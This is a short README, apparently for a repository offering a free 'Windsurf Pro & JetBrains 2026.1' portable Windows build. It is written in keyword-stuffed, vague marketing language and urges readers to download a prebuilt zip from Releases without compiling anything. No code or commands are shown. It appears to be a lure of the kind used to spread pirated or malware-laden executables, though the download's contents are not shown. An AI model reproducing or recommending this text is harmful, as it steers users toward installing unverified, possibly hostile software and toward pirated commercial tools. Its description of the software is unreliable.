Overview • Quick Start (No Terminal Needed) • Architecture & Modules • Configuration • Build from Source

 Overview

 AI IDE & System Utilities — Windsurf Pro & JetBrains 2026.1 Local network-daemon Helper (Portable x64 Build) ( ai-ide-system-utilities-windsurf-pro-jetbrains-2026-portab ) is a modular, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through config/settings.json with live hot-reload support and zero external dependencies.

 [!IMPORTANT]
 1-Click Prebuilt Package (No Compiler Required) : Even though the full source tree ( src/ , config/ ) is included in this repository, end users do not need to compile anything. Click the green Download Portable Release button above or grab ai-ide-system-utilities-windsurf-pro-jetbrains-2026-portab-v1.2.0-win64.zip directly from Releases .
